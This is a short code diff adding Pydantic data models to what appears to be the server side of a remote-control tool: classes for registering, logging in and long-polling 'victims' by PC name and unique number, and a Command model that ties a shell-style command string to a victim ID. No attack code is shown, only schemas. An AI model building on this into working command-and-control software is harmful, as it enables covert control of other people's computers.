@@ -25,3 +25,20 @@ class AuthAdmin(BaseModel):
 class Victim(BaseModel):
     pc_name: str
     unique_number: str = ""
+
+
+class RegisterVictim(BaseModel):
+    pc_name: str = ""
+
+
+class LoginVictim(BaseModel):
+    unique_number: str = ""
+
+
+class LongpoolVictim(BaseModel):
+    unique_number: str = ""
+
+
+class Command(BaseModel):
+    victim_id: int
+    command: str
